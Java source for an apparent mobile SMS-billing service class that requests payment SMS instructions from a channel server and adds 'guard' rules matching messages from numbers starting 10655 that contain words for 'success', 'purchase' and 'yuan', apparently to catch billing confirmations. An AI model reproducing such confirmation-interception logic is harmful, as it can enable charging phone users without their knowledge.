package com.jxt.pay.appclient.service.dynamic.net;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.commons.httpclient.NameValuePair;
import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostParamsData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

public class ZztWoDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(ZztWoDynamicService.class);
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	private static final String TYPE = "zztWo";
	
	private static final Guard guard1 = new Guard("10655","成功|购买|元",2880,"1",0);
	private static final Guard guard2 = new Guard("10655","",960,null,1);
	
	private int timeOut = 60;
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String mobileId = map.get("mobileId");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(mobileId);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(mobileId,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(mobileId);
					return DynamicUtils.parseError("599");
				}
			}
			
			String company = map.get("company");
			
			url += "?company="+company;
			
			NameValuePair[]  params = new NameValuePair[8];
			
			params[0] = new NameValuePair("totalFee",map.get("totalFee"));
			params[1] = new NameValuePair("cid", map.get("cid"));
			params[2] = new NameValuePair("appKey", map.get("appKey"));
			params[3] = new NameValuePair("appName", map.get("appName"));
			params[4] = new NameValuePair("subject", map.get("subject"));
			params[5] = new NameValuePair("imsi","");
			params[6] = new NameValuePair("orderid","");
			params[7] = new NameValuePair("cpParam","");
						
			String responseXml = PostParamsData.postData(url, params);
			
			if(responseXml != null && responseXml.length() > 0 && !"null".equals(responseXml)){
				
				tryMap.remove(mobileId);
				
				try{
					xml = parseXml(map,responseXml);
				}catch(Exception e){
					return DynamicUtils.parseError("597");
				}
			}else{
				logger.info("responseXml is null");
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}
	
	
	private String parseXml(Map<String, String> map,String data){
		
		String dest = SingleXmlUtil.getNodeValue(data, "num");
		String content = SingleXmlUtil.getNodeValue(data, "content");
		
		List<Sms> smsList = new ArrayList<Sms>();
		
		Sms sms = new Sms();
		
		sms.setSmsContent(content);
		sms.setSmsDest(dest);
		sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
		
		smsList.add(sms);
		
		Sms guardSms = new Sms();
		
		List<Guard> guardList = new ArrayList<Guard>();
		
		guardList.add(guard1);
		guardList.add(guard2);

		guardSms.setGuardList(guardList);
		
		smsList.add(0, guardSms);
			
		return XstreamHelper.toXml(smsList);
	}

	public static void main(String[] args){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://smscenter.3gshow.cn:6400/WoChannelSDK/req.ashx");
		map.put("company","zt");
		map.put("appKey","1001");
		try {
			map.put("appName",URLEncoder.encode("欢乐麻将","utf-8"));
			map.put("subject","金币1");
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
		}
		
		map.put("totalFee","1");
		map.put("cid","1051");
		map.put("mobileId", "2892");
		
		System.out.println(new ZztWoDynamicService().dynamic(map));
	}
	
}
